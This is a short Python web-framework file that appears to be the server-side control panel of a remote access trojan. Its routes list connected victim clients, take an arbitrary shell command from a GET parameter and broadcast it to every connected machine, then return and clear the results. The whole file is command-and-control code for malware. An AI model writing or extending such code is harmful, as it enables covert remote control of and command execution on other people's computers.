# coding:utf-8

import json
import zlib
import base64
import time
from view import route, url_for, View, LoginView, AjaxLoginView, AjaxView
import view.socket as sock


@route('/j/rat_info', name='j_rat_info')
class RatInfo(AjaxLoginView):
    def get(self):
        self.finish(json.dumps({
            "data": list(sock.conns.keys()),
        }))


@route('/j/rat/cmd', name='j_rat_cmd')
class RatInfo(AjaxLoginView):
    def get(self):
        cmd = self.get_argument('cmd')
        sock.broadcast_all(cmd)


@route('/j/rat/cmd_result', name='j_rat_cmd_result')
class RatInfo(AjaxLoginView):
    def get(self):
        self.finish(json.dumps({
            "data": sock.cmd_results,
        }))
        sock.cmd_results.clear()
